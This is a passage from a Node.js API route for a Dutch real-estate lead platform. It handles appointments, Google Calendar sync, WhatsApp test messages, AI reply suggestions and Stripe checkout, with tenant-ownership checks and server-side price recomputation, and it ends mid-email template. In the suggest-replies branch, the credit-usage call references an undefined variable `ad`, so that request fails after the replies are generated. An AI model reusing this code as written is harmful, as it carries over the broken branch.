      const apptId = `${projectCode}-${dt.getUTCFullYear().toString().slice(-2)}${String(dt.getUTCMonth()+1).padStart(2,'0')}${String(dt.getUTCDate()).padStart(2,'0')}${String(dt.getUTCHours()).padStart(2,'0')}${String(dt.getUTCMinutes()).padStart(2,'0')}`;
      const fields = {
        'Appointment ID': apptId,
        'Start Time':     body.startTime,
        'Duration':       parseInt(body.duration) || 30,
        'Project Code':   projectCode,
        'Lead Name':      String(body.leadName || '').slice(0, 100),
        'Lead Phone':     String(body.leadPhone || '').slice(0, 30),
        'Status':         'booked',
        'Source':         'manual',
        'Notes':          String(body.notes || '').slice(0, 2000),
        'Created At':     new Date().toISOString()
      };
      if (body.leadId && /^rec[A-Za-z0-9]{14}$/.test(body.leadId)) {
        // SECURITY: verify the lead belongs to this client before linking it
        // to the new appointment — same ownership check as PATCH and
        // appointment-update above. Without this, any authenticated client
        // could link an appointment to another tenant's lead just by
        // guessing/enumerating a record ID.
        try {
          const leadCheck = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${body.leadId}`,
            { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (!leadCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
          const leadData = await leadCheck.json();
          const leadProject = leadData.fields?.['fldSmczuyUJd26HLe'] || leadData.fields?.['Project Code'] || '';
          if (leadProject !== projectCode) {
            return res.status(403).json({ error: 'Geen toegang tot deze lead' });
          }
        } catch (err) {
          console.error('[appointment-create] lead ownership check failed:', err.message);
          return res.status(500).json({ error: 'Serverfout' });
        }
        fields['Lead'] = [body.leadId];
      }
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}`,
          {
            method:  'POST',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields, typecast: true })
          }
        );
        const d = await r.json();
        if (!r.ok) return res.status(500).json({ error: d.error?.message || 'Aanmaken mislukt' });

        // ── Booking confirmation (fail-soft, template-gated) ────────────────
        // Dashboard-created appointments (Source: 'manual') have no guarantee
        // the lead has messaged recently — Meta's 24h customer-service window
        // may well be closed, unlike the AI in-chat booking path
        // (api/whatsapp.js), which sends a freeform confirmation because
        // it's mid-conversation. Gated exactly like cron-followup.js's
        // follow-up loop: only send through an approved template, and NEVER
        // let a confirmation failure break the appointment that was just
        // created (the request already succeeded above).
        const leadPhoneForConfirm = String(fields['Lead Phone'] || '').trim();
        if (leadPhoneForConfirm) {
          await sendAppointmentConfirmation({
            airtableToken: AIRTABLE_TOKEN, baseId: BASE_ID, clientsTable: CLIENTS_TABLE,
            projectCode, phone: leadPhoneForConfirm, leadName: fields['Lead Name'], startTime: body.startTime
          }).catch(err => console.error('[appointment-create] confirmation mislukt (afspraak blijft geldig):', err.message));
        }

        // Mirror into the client's Google Calendar (best-effort, non-blocking).
        // The appointment already exists in Airtable at this point — a Google
        // failure here must never surface as an appointment-create failure.
        // Reuses the gToken/gCalId fetched above for the availability check
        // instead of fetching again.
        let googleEventId = '';
        try {
          if (gToken) {
            const ev = await _gcal.createEvent(gToken, gCalId, {
              summary:     `Afspraak: ${fields['Lead Name'] || 'lead'} (Helvaro)`,
              description: `Telefoon: ${fields['Lead Phone'] || ''}\nProject: ${projectCode}\n${fields['Notes'] || ''}`,
              startISO:    body.startTime,
              durationMin: fields['Duration'],
            });
            if (ev.ok && ev.eventId) {
              googleEventId = ev.eventId;
              await atFetch(`https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${d.id}`, {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { 'Google Event ID': ev.eventId }, typecast: true })
              }).catch(() => {});
            } else if (!ev.ok) {
              console.error('[gcal] create mirror failed:', ev.error);
            }
          }
        } catch (e) { console.error('[gcal] create mirror exception:', e && e.message); }

        return res.status(200).json({ ok: true, id: d.id, apptId, googleEventId });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // body: { mode: 'appointment-update', id, status?, startTime?, duration?, notes? }
    if (body.mode === 'appointment-update') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig record ID' });
      // Cross-tenant security check. Haal eerst record op en verifieer Project Code
      let existingFields = {};
      try {
        const chkR = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!chkR.ok) return res.status(404).json({ error: 'Afspraak niet gevonden' });
        const existing = await chkR.json();
        existingFields = existing.fields || {};
        if (existingFields['Project Code'] !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang tot deze afspraak' });
        }
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
      const updateFields = {};
      if (body.status !== undefined && ['booked', 'completed', 'no_show', 'cancelled', 'rescheduled'].includes(body.status)) {
        updateFields['Status'] = body.status;
      }
      if (body.startTime !== undefined) {
        updateFields['Start Time'] = body.startTime;
        // Rescheduled -> the lead must be reminded about the NEW time.
        // cron-followup.js's reminder query filters on NOT({Reminder Sent}), so
        // leaving the flag set would permanently exclude this appointment and the
        // lead would silently never hear about the change. Clearing it re-arms the
        // 24h reminder for the new slot. (Sending a second reminder for a genuinely
        // rescheduled appointment is correct behaviour, not a duplicate.)
        updateFields['Reminder Sent'] = false;
      }
      if (body.duration  !== undefined) updateFields['Duration']   = parseInt(body.duration) || 30;
      if (body.notes     !== undefined) updateFields['Notes']      = String(body.notes).slice(0, 2000);
      if (Object.keys(updateFields).length === 0) return res.status(400).json({ error: 'Niets om bij te werken' });
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${id}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: updateFields, typecast: true })
          }
        );
        if (!r.ok) return res.status(500).json({ error: 'Update mislukt' });
        const d = await r.json();

        // Sync the change into the client's Google Calendar (best-effort). The
        // Airtable update already succeeded — a Google failure here must never
        // surface as an update failure to the caller.
        try {
          const gEventId = existingFields['Google Event ID'];
          if (gEventId) {
            const { token, calId } = await gcalAccessForProject(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
            if (token) {
              if (updateFields['Status'] === 'cancelled') {
                await _gcal.deleteEvent(token, calId, gEventId);
              } else if (updateFields['Start Time'] || updateFields['Duration']) {
                await _gcal.updateEvent(token, calId, gEventId, {
                  summary:     `Afspraak: ${existingFields['Lead Name'] || 'lead'} (Helvaro)`,
                  description: `Telefoon: ${existingFields['Lead Phone'] || ''}\nProject: ${projectCode}`,
                  startISO:    updateFields['Start Time'] || existingFields['Start Time'],
                  durationMin: updateFields['Duration']   || existingFields['Duration'] || 30,
                });
              }
            }
          }
        } catch (e) { console.error('[gcal] update sync failed:', e && e.message); }

        /* Bij afzeggen ook de twee vlaggen op de lead terugzetten. Zonder dit
           blijft "Appointment Booked" aan -- de lead telt dan door in de
           pipeline en de win rate als iemand met een afspraak die er niet meer
           is -- en blijft "Booking Link Sent" aan, waardoor de AI voor deze
           lead NOOIT meer een nieuwe afspraak kan boeken in het gesprek.
           Welke velden dat zijn en waarom staat in api/_afspraken.js; hier
           alleen de aanroep, zodat er niet twee lijstjes ontstaan. */
        if (updateFields['Status'] === 'cancelled') {
          try {
            await _afspraken.wisLeadVlaggen(existingFields['Lead']);
          } catch (e) { console.error('[afspraken] leadvlaggen na afzegging:', e && e.message); }
        }

        return res.status(200).json({ ok: true, record: d });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── B. Test-message. Send a one-off WhatsApp to a phone number ─────────
    // body: { mode: 'test-message', phone: '32478123456', message: '...' }
    if (body.mode === 'test-message') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const phone = normalizePhoneForWA(body.phone);
      if (!phone) return res.status(400).json({ error: 'Ongeldig telefoonnummer' });
      const message = String(body.message || '').trim().slice(0, 2000);
      if (!message) return res.status(400).json({ error: 'Bericht is leeg' });

      // Per-tenant daily quota. See isTestMessageQuotaExceeded() above.
      if (isTestMessageQuotaExceeded(projectCode)) {
        return res.status(429).json({ error: `Dagelijkse limiet van ${TEST_MSG_DAILY_LIMIT} test-berichten bereikt voor jouw account. Probeer morgen opnieuw.` });
      }

      // Per-client sender number (multitenancy prep): blank on every client
      // today, in which case this resolves to '' and we fall back to the
      // shared env var below — identical to pre-change behaviour.
      const clientPnid      = await getClientWaPhoneNumberId(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
      const PHONE_NUMBER_ID = clientPnid || process.env.PHONE_NUMBER_ID;
      const WHATSAPP_TOKEN  = process.env.WHATSAPP_TOKEN;
      if (!PHONE_NUMBER_ID || !WHATSAPP_TOKEN) {
        return res.status(500).json({ error: 'WhatsApp configuratie ontbreekt op de server' });
      }
      try {
        const waRes = await fetch(`https://graph.facebook.com/v19.0/${PHONE_NUMBER_ID}/messages`, {
          method:  'POST',
          headers: { Authorization: `Bearer ${WHATSAPP_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ messaging_product: 'whatsapp', to: phone, type: 'text', text: { body: message } })
        });
        const waData = await waRes.json().catch(() => ({}));
        if (!waRes.ok || waData.error) {
          console.error('[test-message] WA failed:', JSON.stringify(waData.error || waData).slice(0, 300));
          return res.status(502).json({ error: waData.error?.message || 'WhatsApp versturen mislukt' });
        }
        return res.status(200).json({ ok: true, sentTo: phone });
      } catch (err) {
        return res.status(500).json({ error: 'Netwerkfout. Probeer opnieuw' });
      }
    }

    // ── B2. suggest-replies. AI generates 3 short WhatsApp reply ideas ─────
    // POST { mode: 'suggest-replies', leadId: 'recXXX' }
    // Reads the lead's Conversation History, sends to Claude with the client's
    // AI Name + Client Name + AI Instructions, returns 3 short Dutch replies.
    if (body.mode === 'suggest-replies') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const leadId = String(body.leadId || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(leadId)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const ANTHROPIC_KEY = process.env.ANTHROPIC_API_KEY;
      if (!ANTHROPIC_KEY) return res.status(503).json({ error: 'AI niet beschikbaar' });
      // Discretionary AI (unlike whatsapp.js's lead conversation, this is a
      // manual "give me ideas" click, not the lead-reply promise itself) —
      // BLOCK when the client is over their credit limit. Fails open on any
      // credit-infra problem (missing fields, Airtable down) — see
      // _credits.js's header.
      const creditCheck = await credits.checkCredits(projectCode, credits.FEATURES.REPLY_SUGGESTION);
      if (!creditCheck.allowed) {
        return res.status(402).json({ error: 'credit_limit_reached', message: creditCheck.message });
      }
      try {
        // Fetch the lead. Verify ownership + read history
        const lRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const lead = await lRes.json();
        if ((lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code']) !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang' });
        }
        let history = [];
        const stored = lead.fields?.['Conversation History'];
        if (stored) { try { history = JSON.parse(stored); } catch {} }
        const leadName = lead.fields?.['fldbk0LVNckOU0bqA'] || lead.fields?.['Name'] || '';
        // Look up the client's AI config (cached client may already have it)
        let aiName = 'Mathis', clientName2 = clientName || 'het bedrijf', aiInstr = '';
        try {
          const formula2 = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
          const cRes2 = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula2}&maxRecords=1`,
            { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (cRes2.ok) {
            const cd = await cRes2.json();
            const rec = (cd.records || [])[0];
            if (rec) {
              aiName      = rec.fields['fldRvoe1JMPOtPWC7'] || rec.fields['AI Name']         || aiName;
              clientName2 = rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name']     || clientName2;
              aiInstr     = rec.fields['fld1lqHctRbqFGQf5'] || rec.fields['AI Instructions'] || '';
            }
          }
        } catch {}
        // Build the prompt
        const convText = history.slice(-12).map(m => {
          const role = m.role === 'user' ? 'Klant' : (m.manual ? 'Jij eerder' : 'AI eerder');
          return role + ': ' + String(m.content || '').slice(0, 500);
        }).join('\n');
        const sysPrompt =
          'Je bent ' + aiName + ' van ' + clientName2 + '. Je helpt de salesmedewerker met 3 verschillende, korte WhatsApp-antwoorden die ze nu naar de lead "' + (leadName || 'de lead') + '" zou kunnen sturen. ' +
          (aiInstr ? 'Volg deze stijl-regels: ' + aiInstr.slice(0, 800) + ' ' : '') +
          'Antwoord ALLEEN met geldig JSON: {"replies":["...","...","..."]}. Elk antwoord max 200 tekens. Antwoorden zijn verschillend van toon (bv. Vriendelijk / direct / vraag-stellend). Geen uitleg buiten de JSON.';
        // Via de AI-router: model uit configuratie, uitwijken bij een provider
        // die omvalt, en verbruik geboekt op deze tenant.
        let txt = '';
        try {
          const uit = await _ai.converse({
            ctx: { projectCode, userId: 'dashboard' },
            task: _ai.TASKS.CUSTOMER_QUESTION,
            system: sysPrompt,
            messages: [{ role: 'user', content: 'Recente gespreksgeschiedenis:\n\n' + (convText || '(nog geen berichten)') }],
            maxTokens: 600,
          });
          txt = uit.text || '';
        } catch (err) {
          console.error('[suggest-replies] AI-router fout:', err && err.code, err && err.message);
          return res.status(502).json({ error: 'AI niet bereikbaar' });
        }
        let parsed = null;
        try { parsed = JSON.parse(txt); } catch {
          // Tolerant: extract first {...} block
          const m = txt.match(/\{[\s\S]*\}/);
          if (m) { try { parsed = JSON.parse(m[0]); } catch {} }
        }
        const replies = (parsed && Array.isArray(parsed.replies)) ? parsed.replies.filter(s => typeof s === 'string').slice(0, 3) : [];
        if (!replies.length) return res.status(502).json({ error: 'AI gaf geen suggesties terug' });
        credits.recordUsage(projectCode, credits.FEATURES.REPLY_SUGGESTION, {
          credits: credits.WEIGHTS[credits.FEATURES.REPLY_SUGGESTION],
          tokens: (ad.usage && (ad.usage.input_tokens || 0) + (ad.usage.output_tokens || 0)) || null,
          meta: { leadId },
        }).catch(() => {});
        return res.status(200).json({ replies });
      } catch (err) {
        console.error('[suggest-replies] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── B3. Phase 4 — AI property images (api/_images.js). Folded into this
    // route's existing mode-dispatch (no new route file — see vercel.json's
    // 11-route budget and api/_images.js's own header for why this pattern,
    // not the __gcal-style rewrite, was used). Three modes: property-styles
    // (static list), property-list (this client's saved gallery), and
    // property-generate (the actual OpenAI call — credit-gated, AI-labelled).
    if (body.mode === 'property-styles') {
      // No tenant-specific data, but every mode in this file requires an
      // authenticated client context — matches the rest of the file's
      // posture even though the payload itself is the same for everyone.
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      // roomTypes, and now the visual-controls axes below, are added
      // alongside styles (same static/global payload) rather than a new
      // mode each — one fewer round trip, and keeps the "no new route
      // surface" footprint the same as before this feature expansion.
      return res.status(200).json({
        styles: images.PROPERTY_STYLES.map((s) => ({ key: s.key, label: s.label })),
        roomTypes: images.ROOM_TYPES.map((r) => ({ key: r.key, label: r.label })),
        furnitureLevels: images.FURNITURE_LEVELS.map((f) => ({ key: f.key, label: f.label })),
        wallFinishes: images.WALL_FINISHES.map((w) => ({ key: w.key, label: w.label })),
        wallColors: images.WALL_COLORS.map((c) => ({ key: c.key, label: c.label })),
        floorTypes: images.FLOOR_TYPES.map((f) => ({ key: f.key, label: f.label })),
        lightingMoods: images.LIGHTING_MOODS.map((l) => ({ key: l.key, label: l.label })),
        renovationDepths: images.RENOVATION_DEPTHS.map((r) => ({ key: r.key, label: r.label })),
        defaultRenovationDepth: images.DEFAULT_RENOVATION_DEPTH,
        // The client-customisable axes, emitted from the registry so a new one
        // appears here — and therefore in any UI reading this — automatically.
        extraAxes: images.EXTRA_AXES.map((a) => ({
          key: a.key,
          label: a.label,
          options: a.list.map((x) => ({ key: x.key, label: x.label })),
        })),
        objectAxes: images.OBJECT_AXES.map((a) => ({ key: a.key, label: a.label })),
      });
    }

    if (body.mode === 'property-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const list = await images.listPropertyImages(projectCode);
      return res.status(200).json({ images: list });
    }

    /* ── Panden ──────────────────────────────────────────────────────────────
       Drie modes en geen nieuwe route: Vercel Hobby staat twaalf functies toe
       en die zijn op. Ze hangen hier omdat de tenantcontrole, de sessiecheck
       en de CSRF-poort hierboven al gedaan zijn.

       LET OP de naamgeving. 'property-list' hierboven gaat over AI-BEELDEN van
       panden; 'listing-*' hieronder gaat over de panden zelf. Verwarrend, maar
       'property-list' hernoemen breekt het dashboard van elke klant die de
       pagina open heeft staan tijdens de deploy.

       De projectcode komt uit de geverifieerde sessie hierboven en NOOIT uit
       body: een pandcode staat in een publieke URL en is dus te raden, dus als
       de klant erbij ook nog uit de body kwam kon iedereen elk pand lezen. */
    /* Wat krijg je voor een bedrag. Berekend op de SERVER: zou de browser dit
       uitrekenen, dan is het getal dat een klant ziet ook het getal dat hij kan
       aanpassen. */
    if (body.mode === 'credit-quote') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const offerte = credits.topupOfferte(body.amountEur);
      return res.status(200).json({
        offerte,
        grenzen: { min: credits.TOPUP_MIN_EUR, max: credits.TOPUP_MAX_EUR },
        staffel: credits.TOPUP_STAFFEL,
        /* De tegels komen mee met elke offerte: dan hoeft het scherm geen
           tweede verzoek te doen om te weten welke bedragen er bestaan, en
           staat er nergens in de browser een bedrag dat de server niet kent. */
        presets: credits.topupPresets(),
        /* Wat er van de kaart gaat, uitgesplitst. Zie de uitleg bij btwSplits()
           in api/_plans.js: het bedrag IS het totaal, de btw zit erin. */
        btw: require('./_plans').btwSplits(offerte.geldig ? offerte.bedragEur : 0),
      });
    }

    /* ── Abonnementen ────────────────────────────────────────────────────────
       Wat er nodig is om zonder mens betalend te worden: de plannen tonen, een
       abonnement starten, en het zelf kunnen beheren.

       Er was tot hier geen enkele weg van proefaccount naar betalende klant
       zonder dat iemand met de hand een plan en een creditlimiet in Airtable
       zette. Dat werkt bij drie klanten en breekt bij dertig -- en het breekt
       op het slechtste moment: de klant wil betalen en moet wachten. */
    if (body.mode === 'plan-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const _plans = require('./_plans');
      const abo = await require('./_abonnement').lees(projectCode);
      return res.status(200).json({
        plannen: _plans.publiek(),
        huidig: abo ? { planId: abo.planId, status: abo.status, betalend: abo.betalend,
                        allowance: abo.allowance, kanBeheren: !!abo.klantId } : null,
        stripeAan: require('./_stripe').configured(),
      });
    }

    if (body.mode === 'plan-checkout') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const _stripe = require('./_stripe');
      if (!_stripe.configured()) {
        return res.status(503).json({ error: 'Online betalen staat nog niet aan.', code: 'stripe_uit' });
      }
      const _plans = require('./_plans');
      /* Het plan wordt hier OPGEZOCHT, niet overgenomen. De browser stuurt een
         naam; de prijs komt uit de plantabel. Anders koopt iemand Scale voor
         een euro door één getal in het netwerkverkeer te veranderen. */
      const basisPlan = _plans.plan(body.planId);
      if (!basisPlan) return res.status(400).json({ error: 'Onbekend plan.' });

      /* ── Vanafprijs ────────────────────────────────────────────────────────
         Scale is een vanafprijs: 799 is de bodem en het echte tarief wordt per
         klant afgesproken. Zelf laten afrekenen op 799 zou dus het verkeerde
         bedrag innen én het creditplafond op 20.000 laten staan voor iemand die
         meer afneemt. effectiefPlan() past de afspraak toe en laat de credits
         meeschalen; zonder afspraak komt de klant hier niet doorheen en krijgt
         hij het aanbod dat we een voorstel maken. */
      let afspraak = null;
      try {
        const rij = await require('./_abonnement').klantRij(projectCode);
        if (rij) afspraak = {
          prijsEur: Number(rij.fields['fldD8U058vkEp5knF'] || rij.fields['Agreed Plan Price EUR']) || 0,
          credits:  Number(rij.fields['fldxxYMZfHctA2mNj'] || rij.fields['Agreed Plan Credits'])   || 0,
        };
      } catch (e) {
        console.warn('[plan-checkout] afgesproken prijs niet gelezen:', e && e.message);
      }

      const effectief = _plans.effectiefPlan(basisPlan.id, afspraak);
      if (!effectief.ok) {
        if (effectief.reden === 'prijs_nog_niet_afgesproken') {
          /* Geen fout van de klant: dit plan wordt nu eenmaal per klant geprijsd.
             203 zou hier netter zijn dan 400, maar de dashboardcode leest alleen
             code + error, dus die blijven leidend. */
          return res.status(409).json({
            error: 'Scale stellen we per kantoor samen — vanaf ' + basisPlan.prijsEur
                 + ' euro per maand. Vraag een voorstel, dan rekenen we het voor je uit.',
            code: 'plan_op_maat',
            vanafPrijsEur: basisPlan.prijsEur,
          });
        }
        console.error('[plan-checkout] afspraak deugt niet voor', projectCode, '-', effectief.reden);
        return res.status(409).json({
          error: 'Er klopt iets niet aan de afgesproken prijs voor dit account. We nemen contact op.',
          code: 'afspraak_' + effectief.reden,
        });
      }
      const plan = effectief.plan;

      /* Btw-nummer: hier gevraagd, niet bij het aanmaken van een account.
         Een proefaccount hoeft er geen -- wie eerst wil kijken moet kunnen
         kijken -- maar wie gaat betalen krijgt een factuur, en dat is precies
         het moment waarop "één bedrijf, één account" ertoe doet. Bots
         tegenhouden is een andere taak en staat al bij Clerk en
         api/_signup-guard.js; btw-nummers zijn openbaar en filteren geen bots.

         controleerEnClaim() controleert de vorm, vraagt VIES of het nummer
         bestaat, en claimt het. Zie api/_vat.js voor waarom een VIES-storing
         doorlaat en een "bestaat niet" weigert, en waarom de uniciteit met
         claim-then-verify werkt in plaats van kijken-dan-schrijven. */
      const _vat = require('./_vat');
      const vatUitslag = await _vat.controleerEnClaim({ projectCode, vat: body.vat });
      if (!vatUitslag.ok) {
        return res.status(vatUitslag.code === 'in_gebruik' ? 409 : 400).json({
          error: vatUitslag.melding,
          code:  'vat_' + vatUitslag.code,
          veld:  'vat',
        });
      }

      const abo = await require('./_abonnement').lees(projectCode);
      try {
        const sessie = await _stripe.createSubscription({
          projectCode, plan,
          email: (abo && abo.email) || '',
          klantId: (abo && abo.klantId) || '',
          origin: `https://${req.headers.host || 'app.helvaro.pro'}`,
        });
        if (!sessie || !sessie.url) throw new Error('Stripe gaf geen betaalpagina terug');
        console.log(`[stripe] abonnement ${plan.id} voor ${projectCode} (${sessie.id})`);
        return res.status(200).json({ url: sessie.url });
      } catch (err) {
        console.error('[stripe] abonnement starten mislukt voor', projectCode, '-', err && err.message);
        return res.status(502).json({ error: 'De betaalpagina kon niet geopend worden. Probeer het zo meteen opnieuw.' });
      }
    }

    /* Naar Stripe's eigen portaal: facturen, kaart wijzigen, opzeggen. Bewust
       niet zelf nagebouwd -- een opzegknop die alleen in ons scherm werkt en
       niet bij Stripe laat een klant betalen terwijl hij denkt dat hij weg is. */
    if (body.mode === 'billing-portal') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const _stripe = require('./_stripe');
      const abo = await require('./_abonnement').lees(projectCode);
      if (!_stripe.configured() || !abo || !abo.klantId) {
        return res.status(503).json({ error: 'Er is nog geen betaalgeschiedenis om te beheren.', code: 'geen_klant' });
      }
      try {
        const sessie = await _stripe.billingPortal({
          klantId: abo.klantId,
          origin: `https://${req.headers.host || 'app.helvaro.pro'}`,
        });
        return res.status(200).json({ url: sessie.url });
      } catch (err) {
        const reden = String((err && err.message) || '');
        console.error('[stripe] portaal openen mislukt voor', projectCode, '-', reden);

        /* Eén oorzaak apart, omdat hij niets met de klant te maken heeft en
           precies één keer voorkomt: het klantportaal moet in Stripe eenmalig
           geactiveerd worden (Instellingen > Facturatie > Klantportaal). Is dat
           niet gebeurd, dan weigert Stripe ELKE portaalsessie met "No
           configuration provided". Dat is een instelling van ons, geen storing
           van de klant, en zonder dit onderscheid staat er "probeer het later
           opnieuw" bij iets dat later ook niet werkt.

           Geverifieerd op de live account: er stond geen enkele configuratie. */
        if (/no configuration|default configuration/i.test(reden)) {
          console.error(
            '[stripe] HET KLANTPORTAAL IS NOG NIET GEACTIVEERD IN STRIPE. '
            + 'Zet het eenmalig aan via Stripe > Instellingen > Facturatie > Klantportaal. '
            + 'Tot dan kan geen enkele klant zijn abonnement zelf beheren.');
          return res.status(503).json({
            error: 'Het facturatieportaal is nog niet geactiveerd. We zetten dit meteen recht — je abonnement loopt gewoon door.',
            code: 'portaal_niet_geactiveerd',
          });
        }
        return res.status(502).json({ error: 'Het facturatieportaal kon niet geopend worden.' });
      }
    }

    /* Betalen voor credits, via Stripe.

       Het AANMAKEN van de betaalpagina staat hier en niet in api/stripe.js,
       omdat de sessiecontrole hier al gebeurd is. De webhook heeft een eigen
       route, en om één reden: Stripe tekent de ruwe bytes van de body en Vercel
       parst die weg. Zie de kop van api/stripe.js.

       Het bedrag wordt hier OPNIEUW doorgerekend. Wat de browser meestuurt is
       een wens, geen prijs -- anders koopt iemand 46.000 credits voor een euro
       door één getal in het netwerkverkeer aan te passen. */
    if (body.mode === 'credit-checkout') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });

      const _stripe = require('./_stripe');
      if (!_stripe.configured()) {
        /* Geen sleutel = geen betaalpagina. Het scherm valt dan terug op de
           aanvraag per mail; dat is trager maar het werkt, en het is eerlijker
           dan een knop die niets doet. */
        return res.status(503).json({ error: 'Online betalen staat nog niet aan.', code: 'stripe_uit' });
      }

      const offerte = credits.topupOfferte(body.amountEur);
      if (!offerte.geldig) {
        const teksten = {
          te_laag:     `Het minimum is € ${credits.TOPUP_MIN_EUR}.`,
          te_hoog:     `Voor bedragen boven € ${credits.TOPUP_MAX_EUR} nemen we liever even contact op.`,
          geen_bedrag: 'Vul een bedrag in.',
          geen_tarief: 'Bijkopen staat nog niet aan.',
        };
        return res.status(400).json({ error: teksten[offerte.reden] || 'Dat bedrag kan niet.', code: offerte.reden });
      }

      try {
        const sessie = await _stripe.createCheckout({
          projectCode,
          offerte,
          /* Geen e-mailadres meegeven: dat staat op de klantrij en die is hier
             niet altijd geladen. Stripe vraagt het gewoon op de betaalpagina,
             en een adres dat we niet zeker weten alvast invullen is erger dan
             het niet invullen. */
          origin: `https://${req.headers.host || 'app.helvaro.pro'}`,
        });
        if (!sessie || !sessie.url) throw new Error('Stripe gaf geen betaalpagina terug');
        console.log(`[stripe] betaalpagina voor ${projectCode}: EUR ${offerte.bedragEur} -> ${offerte.credits} credits (${sessie.id})`);
        /* Alleen de URL terug. De credits worden pas geboekt door de webhook,
           nadat Stripe zegt dat er betaald is -- nooit hier, want hier weten we
           alleen dat iemand op een knop heeft geklikt. */
        return res.status(200).json({ url: sessie.url, offerte });
      } catch (err) {
        console.error('[stripe] betaalpagina aanmaken mislukt voor', projectCode, '-', err && err.message);
        return res.status(502).json({ error: 'De betaalpagina kon niet geopend worden. Probeer het zo meteen opnieuw.' });
      }
    }

    /* Een aanvraag om credits bij te kopen, zonder betaalprovider.
    
       Er komen hier GEEN credits bij. Dat is geen tekortkoming maar de enige
       eerlijke vorm zolang er geen betaalprovider hangt: een saldo dat omhoog
       gaat voordat er betaald is, is een verzonnen saldo. De aanvraag gaat naar
       Helvaro, en pas als de betaling binnen is boekt de eigenaar hem bij --
       dat loopt via credits.addCredits(code, n, { type: 'purchase' }) en komt
       dan wél in het grootboek.
    
       Wie hier een betaalprovider aanhangt vervangt precies dit blok: offerte
       opnieuw berekenen, betaalsessie starten, en pas op de webhook bijboeken. */
    if (body.mode === 'credit-purchase-request') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });

      /* Opnieuw berekenen, nooit overnemen wat de browser meestuurt. */
      const offerte = credits.topupOfferte(body.amountEur);
      if (!offerte.geldig) {
        const teksten = {
          te_laag:     `Het minimum is € ${credits.TOPUP_MIN_EUR}.`,
          te_hoog:     `Voor bedragen boven € ${credits.TOPUP_MAX_EUR} nemen we liever even contact op.`,
          geen_bedrag: 'Vul een bedrag in.',
          geen_tarief: 'Bijkopen staat nog niet aan.',
        };
        return res.status(400).json({ error: teksten[offerte.reden] || 'Dat bedrag kan niet.', code: offerte.reden });
      }

      /* De aanvraag naar Helvaro. Faalt de mail, dan hoort de klant dat -- een
         "bedankt" tonen voor een aanvraag die nergens aankwam is erger dan een
         foutmelding. */
      const naarHelvaro = process.env.NOTIFY_EMAIL || process.env.SUPPORT_EMAIL || '';
      if (!naarHelvaro) {
        console.error('[credit-purchase] geen NOTIFY_EMAIL ingesteld — aanvraag van', projectCode, 'kan nergens heen');
        return res.status(503).json({ error: 'Bijkopen kan nu niet automatisch. Mail ons op hello@helvaro.pro.' });
      }

      try {
        const { sendMail } = require('./_mailer');
        await sendMail({
          to: naarHelvaro,
          subject: `[Helvaro] Creditaanvraag: ${clientName || projectCode} — € ${offerte.bedragEur}`,
          html: `<div style="font-family:-apple-system,sans-serif;max-width:480px;margin:auto;padding:20px;color:#111">
            <h2 style="margin:0 0 12px">Creditaanvraag</h2>
            <table style="width:100%;border-collapse:collapse;font-size:14px">
              <tr><td style="padding:6px 0;color:#666">Klant</td><td style="padding:6px 0"><strong>${escHtmlBasic(clientName || '')}</strong> (${escHtmlBasic(projectCode)})</td></tr>
